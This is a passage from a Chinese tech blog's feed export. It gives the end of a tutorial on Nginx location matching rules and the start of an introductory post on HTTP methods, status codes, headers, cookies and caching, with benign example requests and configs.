    <content type="html"><![CDATA[<h2 id="一、语法规则"><a href="#一、语法规则" class="headerlink" title="一、语法规则"></a>一、语法规则</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location [=|~|~*|^~] /uri/ &#123; … &#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td><code>=</code></td><td>开头表示精确匹配</td></tr><tr><td><code>^~</code></td><td>开头表示 uri 以某个常规字符串开头，理解为匹配 <code>url</code> 路径即可。<code>nginx</code> 不对 <code>url</code> 做编码，因此请求为<code>/static/20%/aa</code>，可以被规则<code>^~ /static/ /aa</code>匹配到（注意是空格）</td></tr><tr><td><code>~</code></td><td>开头表示区分大小写的正则匹配</td></tr><tr><td><code>~</code>*</td><td>开头表示不区分大小写的正则匹配</td></tr><tr><td><code>/</code></td><td>通用匹配，任何请求都会匹配到</td></tr></tbody></table><blockquote><p>多个 <code>location</code> 配置的情况下匹配顺序为</p></blockquote><ul><li>首先匹配 <code>=</code></li><li>其次匹配 <code>^~</code></li><li>其次是按文件中顺序的正则匹配</li><li>最后是交给 / 通用匹配</li><li>当有匹配成功时候，停止匹配，按当前匹配规则处理请求</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> = / &#123;</span><br><span class="line">   <span class="comment">#规则A</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> = /login &#123;</span><br><span class="line">   <span class="comment">#规则B</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span><span class="regexp"> ^~</span> /static/ &#123;</span><br><span class="line">   <span class="comment">#规则C</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.(gif|jpg|png|js|css)$</span> &#123;</span><br><span class="line">   <span class="comment">#规则D</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~* \.png$</span> &#123;</span><br><span class="line">   <span class="comment">#规则E</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">   <span class="comment">#规则F</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>那么产生的效果如下</p></blockquote><ul><li>访问根目录 <code>/</code>， 比如 <code>http://localhost/</code> 将匹配规则 <code>A</code></li><li>访问 <code>http://localhost/login</code> 将匹配规则 <code>B</code>，<code>http://localhost/register</code> 则匹配规则 <code>F</code></li><li>访问 <code>http://localhost/static/a.html</code> 将匹配规则 <code>C</code></li><li>访问 <code>http://localhost/a.gif</code>, <code>http://localhost/b.jpg</code> 将匹配规则 <code>D</code>和规则 <code>E</code>，但是规则 <code>D</code> 顺序优先，规则 <code>E</code>不起作用，而 <code>http://localhost/static/c.png</code>则优先匹配到规则 <code>C</code></li><li>访问 <code>http://localhost/a.PNG</code> 则匹配规则 <code>E</code>，而不会匹配规则 <code>D</code>，因为规则 <code>E</code> 不区分大小写</li></ul><blockquote><p>访问 <code>http://localhost/category/id/1111</code> 则最终匹配到规则 <code>F</code>，因为以上规则都不匹配，这个时候应该是 <code>nginx</code> 转发请求给后端应用服务器，比如 <code>FastCGI（PHP</code>），<code>tomcat（jsp）</code>，<code>nginx</code> 作为反向代理服务器存在</p></blockquote><h2 id="二、运用场景"><a href="#二、运用场景" class="headerlink" title="二、运用场景"></a>二、运用场景</h2><blockquote><p>实际使用中，至少有三个匹配规则定义，如下</p></blockquote><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接匹配网站根，通过域名访问网站首页比较频繁，使用这个会加速处理，官网如是说。</span></span><br><span class="line"><span class="comment"># 这里是直接转发给后端应用服务器了，也可以是一个静态首页</span></span><br><span class="line"><span class="comment"># 第一个必选规则</span></span><br><span class="line"><span class="attribute">location</span> = / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://tomcat:8080/index</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 第二个必选规则是处理静态文件请求，这是 nginx 作为 http 服务器的强项</span><br><span class="line"><span class="comment"># 有两种配置模式，目录匹配或后缀匹配，任选其一或搭配使用</span></span><br><span class="line">location<span class="regexp"> ^~</span> /static/ &#123;</span><br><span class="line">    <span class="attribute">root</span> /webroot/static/;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~* \.(gif|jpg|jpeg|png|css|js|ico)$</span> &#123;</span><br><span class="line">    <span class="attribute">root</span> /webroot/res/;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三个规则就是通用规则，用来转发动态请求到后端应用服务器</span></span><br><span class="line"><span class="comment"># 非静态文件请求就默认是动态请求，自己根据实际把握</span></span><br><span class="line"><span class="comment"># 毕竟目前的一些框架的流行，带.php、.jsp后缀的情况很少了</span></span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://tomcat:8080/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、语法规则&quot;&gt;&lt;a href=&quot;#一、语法规则&quot; class=&quot;headerlink&quot; title=&quot;一、语法规则&quot;&gt;&lt;/a&gt;一、语法规则&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
      <category term="Back-end" scheme="http://blog.poetries.top/categories/Back-end/"/>
    
    
      <category term="Nginx" scheme="http://blog.poetries.top/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>HTTP协议系列（一）</title>
    <link href="http://blog.poetries.top/2018/02/26/http-1/"/>
    <id>http://blog.poetries.top/2018/02/26/http-1/</id>
    <published>2018-02-26T15:20:43.000Z</published>
    <updated>2018-04-10T03:33:13.975Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-、基础概念"><a href="#一-、基础概念" class="headerlink" title="一 、基础概念"></a>一 、基础概念</h1><h2 id="1-1-Web-基础"><a href="#1-1-Web-基础" class="headerlink" title="1.1 Web 基础"></a>1.1 Web 基础</h2><ul><li><code>HTTP</code>（<code>HyperText Transfer Protocol</code>，超文本传输协议）。</li><li><code>WWW（World Wide Web）</code>的三种技术：<code>HTML</code>、<code>HTTP</code>、<code>URL</code>。</li><li><code>RFC</code>（<code>Request for Comments</code>，征求修正意见书），互联网的设计文档。</li></ul><h2 id="1-2-URL"><a href="#1-2-URL" class="headerlink" title="1.2 URL"></a>1.2 URL</h2><ul><li><code>URI（</code>Uniform Resource Indentifier`，统一资源标识符）</li><li><code>URL</code>（<code>Uniform Resource Locator</code>，统一资源定位符）</li><li><code>URN</code>（<code>Uniform Resource Name</code>，统一资源名称），例如 <code>urn:isbn:0-486-27557-4</code>。</li></ul><blockquote><p><code>URI</code> 包含 <code>URL</code> 和 <code>URN</code>，目前 <code>WEB</code> 只有 <code>URL</code> 比较流行，所以见到的基本都是 <code>URL</code>。</p></blockquote><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/http-1.jpg" alt=""></p><h2 id="1-3-请求和响应报文"><a href="#1-3-请求和响应报文" class="headerlink" title="1.3 请求和响应报文"></a>1.3 请求和响应报文</h2><h3 id="1-3-1-请求报文"><a href="#1-3-1-请求报文" class="headerlink" title="1.3.1 请求报文"></a>1.3.1 请求报文</h3><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/http2.png" alt=""></p><h3 id="1-3-2-响应报文"><a href="#1-3-2-响应报文" class="headerlink" title="1.3.2. 响应报文"></a>1.3.2. 响应报文</h3><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/http-3.png" alt=""></p><h1 id="二、HTTP-方法"><a href="#二、HTTP-方法" class="headerlink" title="二、HTTP 方法"></a>二、HTTP 方法</h1><ul><li>客户端发送的  <strong>请求报文</strong>  第一行为请求行，包含了方法字段。</li></ul><h2 id="2-1-GET"><a href="#2-1-GET" class="headerlink" title="2.1 GET"></a>2.1 GET</h2><blockquote><p>获取资源</p></blockquote><ul><li>当前网络请求中，绝大部分使用的是 <code>GET</code> 方法。</li></ul><h2 id="2-2-HEAD"><a href="#2-2-HEAD" class="headerlink" title="2.2 HEAD"></a>2.2 HEAD</h2><blockquote><p>获取报文首部</p></blockquote><ul><li>和 <code>GET</code> 方法一样，但是不返回报文实体主体部分。</li><li>主要用于确认 <code>URL</code> 的有效性以及资源更新的日期时间等。</li></ul><h2 id="2-3-POST"><a href="#2-3-POST" class="headerlink" title="2.3 POST"></a>2.3 POST</h2><blockquote><p>传输实体主体</p></blockquote><ul><li><code>POST</code> 主要用来传输数据，而 <code>GET</code> 主要用来获取资源。</li></ul><h2 id="2-4-PUT"><a href="#2-4-PUT" class="headerlink" title="2.4 PUT"></a>2.4 PUT</h2><blockquote><p>上传文件</p></blockquote><ul><li>由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /new.html HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-type: text/html</span><br><span class="line">Content-length: 16</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>New File<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-5-PATCH"><a href="#2-5-PATCH" class="headerlink" title="2.5 PATCH"></a>2.5 PATCH</h2><blockquote><p>对资源进行部分修改</p></blockquote><ul><li><code>PUT</code> 也可以用于修改资源，但是只能完全替代原始资源，<code>PATCH</code> 允许部分修改。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PATCH /file.txt HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/example</span><br><span class="line">If-Match: "e0023aa4e"</span><br><span class="line">Content-Length: 100</span><br><span class="line"></span><br><span class="line">[description of changes]</span><br></pre></td></tr></table></figure><h2 id="2-6-DELETE"><a href="#2-6-DELETE" class="headerlink" title="2.6 DELETE"></a>2.6 DELETE</h2><blockquote><p>删除文件</p></blockquote><ul><li>与 <code>PUT</code> 功能相反，并且同样不带验证机制。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE /file.html HTTP/1.1</span><br></pre></td></tr></table></figure><h2 id="2-7-OPTIONS"><a href="#2-7-OPTIONS" class="headerlink" title="2.7 OPTIONS"></a>2.7 OPTIONS</h2><blockquote><p>查询支持的方法</p></blockquote><ul><li>查询指定的 <code>URL</code> 能够支持的方法。</li><li>会返回 <code>Allow: GET, POST, HEAD, OPTIONS</code> 这样的内容。</li></ul><h2 id="2-8-CONNECT"><a href="#2-8-CONNECT" class="headerlink" title="2.8 CONNECT"></a>2.8 CONNECT</h2><blockquote><p>要求用隧道协议连接代理</p></blockquote><ul><li>要求在与代理服务器通信时建立隧道，使用 <code>SSL</code>（<code>Secure Sockets Layer</code>，安全套接层）和 <code>TLS</code>（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONNECT www.example.com:443 HTTP/1.1</span><br></pre></td></tr></table></figure><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/http-4.jpg" alt=""></p><h2 id="2-9-TRACE"><a href="#2-9-TRACE" class="headerlink" title="2.9 TRACE"></a>2.9 TRACE</h2><blockquote><p>追踪路径</p></blockquote><ul><li>服务器会将通信路径返回给客户端。</li><li>发送请求时，在 <code>Max-Forwards</code> 首部字段中填入数值，每经过一个服务器就会减 <code>1</code>，当数值为 <code>0</code> 时就停止传输。</li><li>通常不会使用 <code>TRACE</code>，并且它容易受到 <code>XST</code> 攻击（<code>Cross-Site Tracing</code>，跨站追踪），因此更不会去使用它。</li></ul><h1 id="三、HTTP-状态码"><a href="#三、HTTP-状态码" class="headerlink" title="三、HTTP 状态码"></a>三、HTTP 状态码</h1><blockquote><p>服务器返回的  <strong>响应报文</strong>  中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。</p></blockquote><table><thead><tr><th style="text-align:center">状态码</th><th style="text-align:center">类别</th><th style="text-align:center">原因短语</th></tr></thead><tbody><tr><td style="text-align:center"><code>1XX</code></td><td style="text-align:center"><code>Informational</code>（信息性状态码）</td><td style="text-align:center">接收的请求正在处理</td></tr><tr><td style="text-align:center"><code>2XX</code></td><td style="text-align:center"><code>Success</code>（成功状态码）</td><td style="text-align:center">请求正常处理完毕</td></tr><tr><td style="text-align:center"><code>3XX</code></td><td style="text-align:center"><code>Redirection</code>（重定向状态码）</td><td style="text-align:center">需要进行附加操作以完成请求</td></tr><tr><td style="text-align:center"><code>4XX</code></td><td style="text-align:center"><code>Client Error</code>（客户端错误状态码）</td><td style="text-align:center">服务器无法处理请求</td></tr><tr><td style="text-align:center"><code>5XX</code></td><td style="text-align:center"><code>Server Error</code>（服务器错误状态码）</td><td style="text-align:center">服务器处理请求出错</td></tr></tbody></table><h2 id="3-1-1XX-信息"><a href="#3-1-1XX-信息" class="headerlink" title="3.1 1XX 信息"></a>3.1 1XX 信息</h2><ul><li><strong>100 Continue</strong> ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。</li></ul><h2 id="3-2-2XX-成功"><a href="#3-2-2XX-成功" class="headerlink" title="3.2 2XX 成功"></a>3.2 2XX 成功</h2><ul><li><p><strong>200 OK</strong> </p></li><li><p><strong>204 No Content</strong> ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。</p></li><li><p><strong>206 Partial Content</strong> ：表示客户端进行了范围请求。响应报文包含由 Content-Range 指定范围的实体内容。</p></li></ul><h2 id="3-3-3XX-重定向"><a href="#3-3-3XX-重定向" class="headerlink" title="3.3 3XX 重定向"></a>3.3 3XX 重定向</h2><ul><li><p><strong>301 Moved Permanently</strong> ：永久性重定向</p></li><li><p><strong>302 Found</strong> ：临时性重定向</p></li><li><p><strong>303 See Other</strong> ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。</p></li><li><p>注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。</p></li><li><p><strong>304 Not Modified</strong> ：如果请求报文首部包含一些条件，例如：If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。</p></li><li><p><strong>307 Temporary Redirect</strong> ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。</p></li></ul><h2 id="3-4-4XX-客户端错误"><a href="#3-4-4XX-客户端错误" class="headerlink" title="3.4 4XX 客户端错误"></a>3.4 4XX 客户端错误</h2><ul><li><p><strong>400 Bad Request</strong> ：请求报文中存在语法错误。</p></li><li><p><strong>401 Unauthorized</strong> ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。</p></li><li><p><strong>403 Forbidden</strong> ：请求被拒绝，服务器端没有必要给出拒绝的详细理由。</p></li><li><p><strong>404 Not Found</strong> </p></li></ul><h2 id="3-5-5XX-服务器错误"><a href="#3-5-5XX-服务器错误" class="headerlink" title="3.5 5XX 服务器错误"></a>3.5 5XX 服务器错误</h2><ul><li><p><strong>500 Internal Server Error</strong> ：服务器正在执行请求时发生错误。</p></li><li><p><strong>503 Service Unavilable</strong> ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</p></li></ul><h1 id="四、HTTP-首部"><a href="#四、HTTP-首部" class="headerlink" title="四、HTTP 首部"></a>四、HTTP 首部</h1><blockquote><p>有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段</p></blockquote><ul><li>各种首部字段及其含义如下（不需要全记，仅供查阅）：</li></ul><h2 id="4-1-通用首部字段"><a href="#4-1-通用首部字段" class="headerlink" title="4.1 通用首部字段"></a>4.1 通用首部字段</h2><table><thead><tr><th style="text-align:center">首部字段名</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>Cache-Control</code></td><td style="text-align:center">控制缓存的行为</td></tr><tr><td style="text-align:center"><code>Connection</code></td><td style="text-align:center">控制不再转发给代理的首部字段、管理持久连接</td></tr><tr><td style="text-align:center"><code>Date</code></td><td style="text-align:center">创建报文的日期时间</td></tr><tr><td style="text-align:center"><code>Pragma</code></td><td style="text-align:center">报文指令</td></tr><tr><td style="text-align:center"><code>Trailer</code></td><td style="text-align:center">报文末端的首部一览</td></tr><tr><td style="text-align:center"><code>Transfer-Encoding</code></td><td style="text-align:center">指定报文主体的传输编码方式</td></tr><tr><td style="text-align:center"><code>Upgrade</code></td><td style="text-align:center">升级为其他协议</td></tr><tr><td style="text-align:center"><code>Via</code></td><td style="text-align:center">代理服务器的相关信息</td></tr><tr><td style="text-align:center"><code>Warning</code></td><td style="text-align:center">错误通知</td></tr></tbody></table><h2 id="4-2-请求首部字段"><a href="#4-2-请求首部字段" class="headerlink" title="4.2 请求首部字段"></a>4.2 请求首部字段</h2><table><thead><tr><th style="text-align:center">首部字段名</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>Accept</code></td><td style="text-align:center">用户代理可处理的媒体类型</td></tr><tr><td style="text-align:center"><code>Accept-Charset</code></td><td style="text-align:center">优先的字符集</td></tr><tr><td style="text-align:center"><code>Accept-Encoding</code></td><td style="text-align:center">优先的内容编码</td></tr><tr><td style="text-align:center"><code>Accept-Language</code></td><td style="text-align:center">优先的语言（自然语言）</td></tr><tr><td style="text-align:center"><code>Authorization</code></td><td style="text-align:center"><code>Web</code> 认证信息</td></tr><tr><td style="text-align:center"><code>Expect</code></td><td style="text-align:center">期待服务器的特定行为</td></tr><tr><td style="text-align:center"><code>From</code></td><td style="text-align:center">用户的电子邮箱地址</td></tr><tr><td style="text-align:center"><code>Host</code></td><td style="text-align:center">请求资源所在服务器</td></tr><tr><td style="text-align:center"><code>If-Match</code></td><td style="text-align:center">比较实体标记（<code>ETag</code>）</td></tr><tr><td style="text-align:center"><code>If-Modified-Since</code></td><td style="text-align:center">比较资源的更新时间</td></tr><tr><td style="text-align:center"><code>If-None-Match</code></td><td style="text-align:center">比较实体标记（与 <code>If-Match</code> 相反）</td></tr><tr><td style="text-align:center"><code>If-Range</code></td><td style="text-align:center">资源未更新时发送实体 <code>Byte</code> 的范围请求</td></tr><tr><td style="text-align:center"><code>If-Unmodified-Since</code></td><td style="text-align:center">比较资源的更新时间（与 <code>If-Modified-Since</code>相反）</td></tr><tr><td style="text-align:center"><code>Max-Forwards</code></td><td style="text-align:center">最大传输逐跳数</td></tr><tr><td style="text-align:center"><code>Proxy-Authorization</code></td><td style="text-align:center">代理服务器要求客户端的认证信息</td></tr><tr><td style="text-align:center"><code>Range</code></td><td style="text-align:center">实体的字节范围请求</td></tr><tr><td style="text-align:center"><code>Referer</code></td><td style="text-align:center">对请求中 <code>URI</code> 的原始获取方</td></tr><tr><td style="text-align:center"><code>TE</code></td><td style="text-align:center">传输编码的优先级</td></tr><tr><td style="text-align:center"><code>User-Agent</code></td><td style="text-align:center"><code>HTTP</code> 客户端程序的信息</td></tr></tbody></table><h2 id="4-3-响应首部字段"><a href="#4-3-响应首部字段" class="headerlink" title="4.3 响应首部字段"></a>4.3 响应首部字段</h2><table><thead><tr><th style="text-align:center">首部字段名</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>Accept-Ranges</code></td><td style="text-align:center">是否接受字节范围请求</td></tr><tr><td style="text-align:center"><code>Age</code></td><td style="text-align:center">推算资源创建经过时间</td></tr><tr><td style="text-align:center"><code>ETag</code></td><td style="text-align:center">资源的匹配信息</td></tr><tr><td style="text-align:center"><code>Location</code></td><td style="text-align:center">令客户端重定向至指定 <code>URI</code></td></tr><tr><td style="text-align:center"><code>Proxy-Authenticate</code></td><td style="text-align:center">代理服务器对客户端的认证信息</td></tr><tr><td style="text-align:center"><code>Retry-After</code></td><td style="text-align:center">对再次发起请求的时机要求</td></tr><tr><td style="text-align:center"><code>Server</code></td><td style="text-align:center"><code>HTTP</code> 服务器的安装信息</td></tr><tr><td style="text-align:center"><code>Vary</code></td><td style="text-align:center">代理服务器缓存的管理信息</td></tr><tr><td style="text-align:center"><code>WWW-Authenticate</code></td><td style="text-align:center">服务器对客户端的认证信息</td></tr></tbody></table><h2 id="4-4-实体首部字段"><a href="#4-4-实体首部字段" class="headerlink" title="4.4 实体首部字段"></a>4.4 实体首部字段</h2><table><thead><tr><th style="text-align:center">首部字段名</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>Allow</code></td><td style="text-align:center">资源可支持的 <code>HTTP</code>方法</td></tr><tr><td style="text-align:center"><code>Content-Encoding</code></td><td style="text-align:center">实体主体适用的编码方式</td></tr><tr><td style="text-align:center"><code>Content-Language</code></td><td style="text-align:center">实体主体的自然语言</td></tr><tr><td style="text-align:center"><code>Content-Length</code></td><td style="text-align:center">实体主体的大小</td></tr><tr><td style="text-align:center"><code>Content-Location</code></td><td style="text-align:center">替代对应资源的 <code>URI</code></td></tr><tr><td style="text-align:center"><code>Content-MD5</code></td><td style="text-align:center">实体主体的报文摘要</td></tr><tr><td style="text-align:center"><code>Content-Range</code></td><td style="text-align:center">实体主体的位置范围</td></tr><tr><td style="text-align:center"><code>Content-Type</code></td><td style="text-align:center">实体主体的媒体类型</td></tr><tr><td style="text-align:center"><code>Expires</code></td><td style="text-align:center">实体主体过期的日期时间</td></tr><tr><td style="text-align:center"><code>Last-Modified</code></td><td style="text-align:center">资源的最后修改日期时间</td></tr></tbody></table><h1 id="五、具体应用"><a href="#五、具体应用" class="headerlink" title="五、具体应用"></a>五、具体应用</h1><h2 id="5-1-Cookie"><a href="#5-1-Cookie" class="headerlink" title="5.1 Cookie"></a>5.1 Cookie</h2><ul><li><code>HTTP</code> 协议是无状态的，主要是为了让 <code>HTTP</code> 协议尽可能简单，使得它能够处理大量事务。<code>HTTP/1.1</code> 引入 <code>Cookie</code> 来保存状态信息。</li><li><code>Cookie</code> 是服务器发送给客户端的数据，该数据会被保存在浏览器中，并且客户端的下一次请求报文会包含该数据。通过 <code>Cookie</code> 可以让服务器知道两个请求是否来自于同一个客户端，从而实现保持登录状态等功能。</li></ul><h3 id="5-1-1-创建过程"><a href="#5-1-1-创建过程" class="headerlink" title="5.1.1 创建过程"></a>5.1.1 创建过程</h3><ul><li>服务器发送的响应报文包含 <code>Set-Cookie</code> 字段，客户端得到响应报文后把 <code>Cookie</code> 内容保存到浏览器中</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-type: text/html</span><br><span class="line">Set-Cookie: yummy_cookie=choco</span><br><span class="line">Set-Cookie: tasty_cookie=strawberry</span><br><span class="line"></span><br><span class="line">[page content]</span><br></pre></td></tr></table></figure><ul><li>客户端之后发送请求时，会从浏览器中读出 <code>Cookie</code> 值，在请求报文中包含 <code>Cookie</code> 字段</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /sample_page.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span><br></pre></td></tr></table></figure><h3 id="5-1-2-分类"><a href="#5-1-2-分类" class="headerlink" title="5.1.2 分类"></a>5.1.2 分类</h3><ul><li>会话期 <code>Cookie</code>：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。</li><li>持久性 <code>Cookie</code>：指定一个特定的过期时间（<code>Expires</code>）或有效期（<code>Max-Age</code>）之后就成为了持久性的 <code>Cookie</code>。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure><h3 id="5-1-3-Set-Cookie"><a href="#5-1-3-Set-Cookie" class="headerlink" title="5.1.3 Set-Cookie"></a>5.1.3 Set-Cookie</h3><table><thead><tr><th style="text-align:center">属性</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>NAME=VALUE</code></td><td>赋予 <code>Cookie</code> 的名称和其值（必需项）</td></tr><tr><td style="text-align:center"><code>expires=DATE</code></td><td><code>Cookie</code> 的有效期（若不明确指定则默认为浏览器关闭前为止）</td></tr><tr><td style="text-align:center"><code>path=PATH</code></td><td>将服务器上的文件目录作为 <code>Cookie</code> 的适用对象（若不指定则默认为文档所在的文件目录）</td></tr><tr><td style="text-align:center"><code>domain=域名</code></td><td>作为 <code>Cookie</code> 适用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名）</td></tr><tr><td style="text-align:center"><code>Secure</code></td><td>仅在 <code>HTTPs</code> 安全通信时才会发送 <code>Cookie</code></td></tr><tr><td style="text-align:center"><code>HttpOnly</code></td><td>加以限制，使 <code>Cookie</code> 不能被 <code>JavaScript</code> 脚本访问</td></tr></tbody></table><h3 id="5-1-4-Session-和-Cookie-区别"><a href="#5-1-4-Session-和-Cookie-区别" class="headerlink" title="5.1.4 Session 和 Cookie 区别"></a>5.1.4 Session 和 Cookie 区别</h3><blockquote><p><code>Session</code> 是服务器用来跟踪用户的一种手段，每个 Session 都有一个唯一标识：Session ID。当服务器创建了一个 Session 时，给客户端发送的响应报文包含了 Set-Cookie 字段，其中有一个名为 sid 的键值对，这个键值对就是 Session ID。客户端收到后就把 Cookie 保存在浏览器中，并且之后发送的请求报文都包含 Session ID。HTTP 就是通过 Session 和 Cookie 这两种方式一起合作来实现跟踪用户状态的，Session 用于服务器端，Cookie 用于客户端。</p></blockquote><h3 id="5-1-5-浏览器禁用-Cookie-的情况"><a href="#5-1-5-浏览器禁用-Cookie-的情况" class="headerlink" title="5.1.5 浏览器禁用 Cookie 的情况"></a>5.1.5 浏览器禁用 Cookie 的情况</h3><blockquote><p>会使用 <code>URL</code> 重写技术，在 <code>URL</code> 后面加上 <code>sid=xxx</code> 。</p></blockquote><h3 id="5-1-6-使用-Cookie-实现用户名和密码的自动填写"><a href="#5-1-6-使用-Cookie-实现用户名和密码的自动填写" class="headerlink" title="5.1.6 使用 Cookie 实现用户名和密码的自动填写"></a>5.1.6 使用 Cookie 实现用户名和密码的自动填写</h3><ul><li>网站脚本会自动从保存在浏览器中的 <code>Cookie</code> 读取用户名和密码，从而实现自动填写。</li><li>但是如果 <code>Set-Cookie</code> 指定了 <code>HttpOnly</code>属性，就无法通过 <code>Javascript</code>脚本获取 <code>Cookie</code>信息，这是出于安全性考虑。</li></ul><h2 id="5-2-缓存"><a href="#5-2-缓存" class="headerlink" title="5.2 缓存"></a>5.2 缓存</h2><h3 id="5-2-1-优点"><a href="#5-2-1-优点" class="headerlink" title="5.2.1 优点"></a>5.2.1 优点</h3><ul><li>降低服务器的负担；</li><li>提高响应速度（缓存资源比服务器上的资源离客户端更近）</li></ul><h3 id="5-2-2-实现方法"><a href="#5-2-2-实现方法" class="headerlink" title="5.2.2 实现方法"></a>5.2.2 实现方法</h3><ul><li>让代理服务器进行缓存</li><li>让客户端浏览器进行缓存</li></ul><h3 id="5-2-3-Cache-Control-字段"><a href="#5-2-3-Cache-Control-字段" class="headerlink" title="5.2.3 Cache-Control 字段"></a>5.2.3 Cache-Control 字段</h3><ul><li><code>HTTP</code> 通过 <code>Cache-Control</code> 首部字段来控制缓存。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: private, max-age=0, no-cache</span><br></pre></td></tr></table></figure><h3 id="5-2-4-no-cache-指令"><a href="#5-2-4-no-cache-指令" class="headerlink" title="5.2.4 no-cache 指令"></a>5.2.4 no-cache 指令</h3><ul><li>该指令出现在请求报文的 <code>Cache-Control</code> 